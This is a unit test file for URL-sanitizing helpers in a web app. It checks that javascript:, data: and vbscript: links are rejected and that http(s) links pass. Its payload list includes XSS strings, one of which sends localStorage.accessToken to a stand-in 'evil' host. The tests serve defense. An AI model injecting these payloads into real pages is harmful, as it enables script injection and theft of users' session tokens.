import { describe, it, expect } from 'vitest'
import { isSafeUrl, safeExternalUrl, safeHttpUrl } from '../safeUrl'

// XSS payloads that Zod's .url() WRONGLY accepts — these must all be rejected
const XSS_PAYLOADS = [
  'javascript:alert(1)',
  'javascript:fetch("//evil/"+localStorage.accessToken)',
  'JaVaScRiPt:alert(1)', // case games
  '  javascript:alert(1)  ', // leading/trailing space
  'data:text/html,<script>alert(1)</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  'vbscript:msgbox(1)',
]

const SAFE_URLS = [
  'https://yourstore.com',
  'http://example.com/path?q=1',
  'https://sub.domain.co/a/b',
]

describe('safeHttpUrl — Zod input validation', () => {
  it('rejects script/data/vbscript schemes', () => {
    for (const p of XSS_PAYLOADS) {
      expect(safeHttpUrl(p), p).toBe(false)
    }
  })

  it('accepts http and https', () => {
    for (const u of SAFE_URLS) {
      expect(safeHttpUrl(u), u).toBe(true)
    }
  })

  it('rejects mailto/tel (not valid for a website field)', () => {
    expect(safeHttpUrl('mailto:a@b.com')).toBe(false)
    expect(safeHttpUrl('tel:+123')).toBe(false)
  })

  it('rejects garbage', () => {
    expect(safeHttpUrl('not a url')).toBe(false)
    expect(safeHttpUrl('')).toBe(false)
  })
})

describe('safeExternalUrl — render-time href guard', () => {
  it('returns undefined for every XSS payload (anchor gets no href)', () => {
    for (const p of XSS_PAYLOADS) {
      expect(safeExternalUrl(p), p).toBeUndefined()
    }
  })

  it('returns the trimmed URL for safe http(s) links', () => {
    expect(safeExternalUrl('  https://shop.ng  ')).toBe('https://shop.ng')
  })

  it('allows in-app relative links but not protocol-relative', () => {
    expect(safeExternalUrl('/discover')).toBe('/discover')
    expect(safeExternalUrl('//evil.com')).toBeUndefined()
  })

  it('returns undefined for null/empty', () => {
    expect(safeExternalUrl(null)).toBeUndefined()
    expect(safeExternalUrl(undefined)).toBeUndefined()
    expect(safeExternalUrl('')).toBeUndefined()
  })
})

describe('isSafeUrl', () => {
  it('allows mailto/tel (used by support links)', () => {
    expect(isSafeUrl('mailto:support@marketx.com')).toBe(true)
    expect(isSafeUrl('tel:+2348012345678')).toBe(true)
  })
})
